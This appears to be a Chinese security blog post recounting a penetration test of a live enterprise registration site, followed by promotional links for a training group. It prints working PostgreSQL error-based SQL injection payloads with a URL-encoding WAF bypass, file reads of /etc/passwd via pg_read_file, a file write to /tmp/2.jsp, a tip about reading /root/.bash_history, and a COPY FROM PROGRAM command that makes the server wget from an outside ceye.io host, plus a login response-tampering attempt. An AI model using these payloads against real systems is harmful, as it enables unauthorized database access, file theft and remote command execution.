#  未授权漏洞渗透技巧总结分享（十）  
L1NG  C4安全   2026-01-08 02:28  
  
原文作者  
：  
L1NG  
  
原文链接：  
https://forum.butian.net/share/1344  
  
## 未授权访问  
  
**书接上回，从登录框开始挖到了一些漏洞，然后接下来挖掘**  
# 0x01PDSQL注入  
  
**回归企业用户注册正题来了，接下来干货满满**  
  
****  
**点击搜索按钮抓包，发现一个搜索的数据包通过对单引号报错以及双单引号闭合，发现了一个sql注入**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRnOvLL52lWHG9XQNeuAPxib58RtwuWwadEQLyeabdV2JNuUbyfEoPCkRWQVX4JjMskEespchhR6FQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRnOvLL52lWHG9XQNeuAPxibkM1z4okibkgPlGeBJ6OicYxEcZbl4zuD3V1XQ1Aof6Xv7s77ic6oXaKoQ/640?wx_fmt=png&from=appmsg "")  
  
**尝试输入payload，好家伙存在阿某云WAF，sqlmap也跑不了了，只能手注入了**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRnOvLL52lWHG9XQNeuAPxibQ6q1klWKThLkAAGoLsc6G7XRJpYRxcLeV7IiaiciaSxgppYOZxkDZ0JPg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJRnOvLL52lWHG9XQNeuAPxib5GsW8iaVaNDkJ15t8QPtMyPs6650nRhJpK1EgmLXib5bTKAIYIU3COAQ/640?wx_fmt=jpeg&from=appmsg "")  
  
**先通过报错查看是什么类型的数据库，通过查询报错语句最终定位是PostgreSQL，这属实有点少见噢**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRnOvLL52lWHG9XQNeuAPxibialJqrXx3APCt99w3JGy4ViarJx3H2Vibl00rEzpB2P9EFHiaFQJtdZRicg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRnOvLL52lWHG9XQNeuAPxibwIVKs0LaEdQXiarHnYY2uHlmibICRJj4QUSMmIjO4BIxDepBIlKhAMSw/640?wx_fmt=png&from=appmsg "")  
  
先查看报错的地方来定位sql语句再来构造报错语句，在参数后面添加'11  
可以看到下面报错sql语句长这样 SELECT * FROM tbl_org WHERE(name '%%' AND type=400)  
 ,传入的数据在两个百分号之间。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRnOvLL52lWHG9XQNeuAPxibjs9w7YJ6fZq7ib62QllcxxKaR8JcPzrv2QY6F2seKrpLGc1ryT5fGZw/640?wx_fmt=png&from=appmsg "")  
  
**一开始我尝试在参数后面添加';payload--+，这样子堆叠注入结果是被拦截了，没办法了只能请大哥-坏学生来帮帮我，不愧是大哥两个小时秒了，给了我一个语句'||(to_date(substring(current_database()from 1 for 1),'qwe'))||'和一张图片**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRnOvLL52lWHG9XQNeuAPxibTM5o5IKygQkBQ2BsNEibu8aPBR9A0f80bREk2Vyl4noyIbiaUNkb2mdQ/640?wx_fmt=png&from=appmsg "")  
  
**现在来分析一下这个语句，单引号'是用来闭合原本语句中的前单引号'，符号“||”则是用来拼接字符串，意思就是在PDSQL中，一个Select语句可以同时执行多个语句。继续看to_date这个函数的用法**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRnOvLL52lWHG9XQNeuAPxibCsOEnS1GePUeZywh3Zuiclkre1E2zK0Eo1srtyicqkQGyY0V8YqOIEvQ/640?wx_fmt=png&from=appmsg "")  
  
**这个函数是用来出错的，substring(current_database)通过将数据库名字拆成一个个字符，然后与后面的qwe进行比较，如果出错就会报出数据库的名字，通过修改from后面的数字可以修改数据库的第几位字符，这样就把数据库名字给注入出来了。tip:这里的语句需要使用URL编码加密过WAF不然会被拦截。查看历史数据包内容发现在加载小区的时候也进行了一次查询，同理在该参数也存在SQL注入，高危漏洞又+1**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRnOvLL52lWHG9XQNeuAPxibAm05icYES1rgbxzunQRWF4R9dKbwleMnPW8Ga6ibJjGcZoU1z4vTw2jg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRnOvLL52lWHG9XQNeuAPxibicQDnIGTpjt9AUUr6b9wZ9hicM4tfoO48Aav9qrh2CmNic2eNib6ceLPZA/640?wx_fmt=png&from=appmsg "")  
# 0x02任意文件读取  
  
**继续查看PDSQL的一些高级注入手法发现，可以读取文件和写入文件，通过 '||(to_date(pg_read_file('/etc/passwd',2,20),'qwe'))||',即可读取文件了，该方法同理也是用一个个字符报错得出的，通过修改文件后面的第一位数字就可以读取，任意文件读取高危漏洞+1。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRnOvLL52lWHG9XQNeuAPxibEnwDhspgm09JdZK4jexy74HARz9FY2togK4ICUyN13z6oibFzfRyaHw/640?wx_fmt=png&from=appmsg "")  
# 0x03任意文件写入  
  
**使用PDSQL的文件写入方法，利用payload:1');COPY (select 1234) to '/tmp/2.jsp';--，并且用URL编码加密在tmp目录下2.jsp文件写入1234**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRnOvLL52lWHG9XQNeuAPxibBh0icY1w9jaibg77uQUZDS2NfMaC75qyez2QX53kEQw2u8pF2YaBiaB4g/640?wx_fmt=png&from=appmsg "")  
  
**然后使用'||(to_date(pg_read_file('/tmp/2.jsp',4,20),'qwe'))||'查询tmp目录下的2.jsp，已经上传成功了**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRnOvLL52lWHG9XQNeuAPxibqv8N63udh9T5OIOnYMicUAkpUVMUzA4zCIoB4ibue48NYqxXCS1ZJ0Tw/640?wx_fmt=png&from=appmsg "")  
  
**如果使用'||(to_date(pg_read_file('/tmp/3.jsp',4,20),'qwe'))||'读取tmp目录下3.jsp是不存在的**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRnOvLL52lWHG9XQNeuAPxib3NdmcRWFiaWlt915oqCAPPACGbMnxWKiaFC2KMvDREBiaegZD4ujHp2uQ/640?wx_fmt=png&from=appmsg "")  
  
**这里不知道网站的绝对路径就只能证明可以上传了，因为网站是用的spring框架，不知道是在哪里打的jar包。有一个小技巧是通过读取/root/.bash_history查看历史命令就可以看到项目的具体路径不过太麻烦了只能一个个字符读取，索性放弃了。**  
# 0x04命令执行  
  
**使用payload:1');CREATE TABLE zz(zz_output text);COPY zz FROM PROGRAM 'wget http://XX.XX.ceye.io/1.jpg';--远程执行命令看看ceye平台有无回显，可惜数据库服务器不给力，直接退出进程了。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRnOvLL52lWHG9XQNeuAPxibAV7wTiaFvsa8f97RyWsLDrTndkcN2tAzFeskEY46qcrsqQkqia5kWib2A/640?wx_fmt=png&from=appmsg "")  
  
**期间还试过注册了账号，不过需要审批才能使用功能只能登陆，以及尝试利用信息收集到的手机号再结合我登入成功的数据包替换返回包尝试任意用户登陆，不过出了点问题数据加载不出来，估计存在二次校验。**  
#### 秉持着可持续发展原则，这次渗透就到这里了，鸣谢我同事潇师傅以及坏学生大佬的帮助~咱们下次再见  
####   
  
结语  
  
感兴趣的师傅可以公众号私聊我  
进团队交流群，  
咨询问题，hvv简历投递，nisp和cisp考证都可以联系我  
  
**内部src培训视频，内部知识圈，可私聊领取优惠券，加入链接：https://wiki.freebuf.com/societyDetail?society_id=184**  
  
**安全渗透感知大家族**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJReicd6uXKczzQic8oK6AWCquBpLg1n1jrAqoRRbtibFage6zaO47rcz2D28gABiaHNLnAIJYIJThyVfw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=17 "")  
  
****  
（新人优惠券折扣  
20.9  
￥，扫码即可领取更多优惠）  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTSQH5E3H4ftK9NNic4tjnibbONOm5Yvz0BCCpSwOz8jhPI0f90Ppbey0fuYp0SDLG5equx9M1a6fLA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic#imgIndex=30 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkpxDWia5shmzQH4UialWGUCsoWYMHVpcEtUxF7RsfJaHKl9gsVWEjqAuw/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic#imgIndex=16 "")  
  
****  
**加入团队、加入公开群等都可联系微信：yukikhq，搜索添加即可**  
  
****  
END  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=7 "")  
  
**往期回顾**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=8 "")  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=9 "")  
  
[实战SRC-漏洞挖掘之XSS案例](https://mp.weixin.qq.com/s?__biz=MzkzMzE5OTQzMA==&mid=2247488557&idx=1&sn=c0fde2a563e2e3df0f90eb7df494dea4&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=10 "")  
  
                    [海外SRC挖掘-业务逻辑漏洞案例分享](https://mp.weixin.qq.com/s?__biz=MzkzMzE5OTQzMA==&mid=2247488515&idx=1&sn=6e33530abdd437c4fd7e0b4d7435105c&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=11 "")  
  
[FOFA API 驱动的团队资产发现工具 - Cloud Server](https://mp.weixin.qq.com/s?__biz=MzkzMzE5OTQzMA==&mid=2247487707&idx=1&sn=66c094a3b3d359f9d6beded7a909347b&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=12 "")  
  
[闪紫 - AI赋能社工字典生成工具，自动联想关联变体](https://mp.weixin.qq.com/s?__biz=MzkzMzE5OTQzMA==&mid=2247488623&idx=1&sn=1947cb0ef9ccd230c3e04c698afd290e&scene=21#wechat_redirect)  
  
  
  
  
  
